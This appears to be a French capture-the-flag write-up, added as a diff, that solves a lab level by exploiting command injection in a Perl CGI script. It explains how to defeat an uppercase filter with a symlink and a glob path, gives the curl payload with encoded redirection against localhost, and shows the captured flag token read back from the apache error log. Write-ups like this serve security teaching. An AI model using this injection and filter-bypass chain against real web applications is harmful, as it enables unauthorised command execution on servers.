@@ -1,0 +1,35 @@
+1. En analysant le script perl, on voit qu'il y a une execution de commande, ce qui correspond a notre faille :
+
+	"@output = `egrep "^$xx" /tmp/xd 2>&1`;"
+
+Il suffit simplement d'injecter une commande, par exemple la commande getflag, a l'aide de $xx qui correspond au premier argument passer a la fonction, et au paramètre x passer dans l'url
+
+			--------------------------------------------------------------------------------------------------------------
+
+2. Passer la commande "getflag" ne suffirait pas car il y a du traitement de texte juste avant la faille qui transforme tous les caractère minuscules en majuscule, et qui supprime tout ce qu'il y a après une espace :
+
+	$xx =~ tr/a-z/A-Z/;
+	$xx =~ s/\s.*//;
+
+Il faudrait donc créer un lien symbolique vers /bin/getflag, un lien dont le nom est en majuscule que l'on pourrait directement passer a l'execution :
+
+ln -s /bin/getflag /tmp/GETFLAG
+
+			--------------------------------------------------------------------------------------------------------------
+
+3. Une fois le lien symbolique créer, on peut injecter ce lien en tant que commande a executer a l'aide de curl :
+
+curl 'http://localhost:4646?x=`/*/GETFLAG%3E%262`'
+
+Le wildcard nous permet de ne pas ecrire /tmp qui serait mis en majuscule et qui ne serait plus valide
+%3E = >
+%26 = &
+On utilise les valeurs ascii de ces caractère pour ne pas qu'ils soient interprétés
+
+			--------------------------------------------------------------------------------------------------------------
+
+4. On redirige donc l'output de getflag dans stderr, et nous pouvons y accéder via les log de apache2 dans /var/log/apache2/error.log
+
+tail /var/log/apache2/error.log
+
+[Sun Apr 27 17:39:03 2025] [error] [client 127.0.0.1] Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
